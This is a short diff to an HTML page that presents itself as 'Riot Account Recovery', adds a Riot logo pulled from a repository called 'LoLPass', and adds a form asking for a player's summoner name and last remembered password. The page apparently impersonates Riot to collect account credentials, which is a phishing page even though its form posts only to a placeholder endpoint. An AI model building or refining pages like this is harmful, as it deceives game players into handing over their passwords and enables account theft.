@@ -4,10 +4,20 @@
 <head>
   <meta charset="utf-8">
   <title>Riot Account Recovery</title>
+  <link href="https://fonts.googleapis.com/css?family=Quicksand:500&amp;display=swap" rel="stylesheet" />
 </head>
 
-<body>
-  <div class="form">
-  <center><h2>Riot Account Recovery</h2><p>Please answer the following questions to recover your account.</p></center>
+<body style="text-align:center">
+<header><img src="https://raw.githubusercontent.com/dmbd2019/LoLPass/master/img/RiotLogo.png" style="width:25vw; height:auto;"></header>
+  <div class="form" style="display:inline-block">
+  <h2>Riot Account Recovery</h2><p>Please answer the following questions to recover your account.</p><br>
+  <form action="/action_page.php">
+  <label for="summoner">Summoner's Name:</label><br>
+  <input type="text" id="summoner" name="summoner" value="Please fill out this box."><br><br>
+  <label for="lpass">Last password you remember:</label><br>
+  <input type="text" id="lpass" name="lpass" value="Please fill out this box."><br><br>
+  <input type="submit" value="Submit">
+</form> 
+</div>
 </body>
 </html>
